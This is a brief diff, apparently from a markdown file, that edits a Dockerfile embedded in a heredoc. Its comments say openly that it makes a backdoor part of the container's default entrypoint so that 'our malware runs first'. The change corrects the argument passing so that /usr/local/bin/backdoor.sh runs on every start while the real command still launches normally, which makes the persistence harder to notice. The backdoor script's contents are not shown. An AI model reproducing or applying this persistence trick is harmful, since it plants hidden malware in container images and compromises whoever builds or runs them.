@@ -87,7 +87,7 @@ RUN echo '#!/bin/sh' > /etc/profile.d/init.sh && \
 
 # Make the backdoor part of the default entrypoint behavior
 # When the container starts, our malware runs first
-ENTRYPOINT ["/bin/sh", "-c", "/usr/local/bin/backdoor.sh && exec $0 $@", "/bin/sh"]
+ENTRYPOINT ["/bin/sh", "-c", "/usr/local/bin/backdoor.sh && exec \"$@\"", "--"]
 EOF
 ```
 
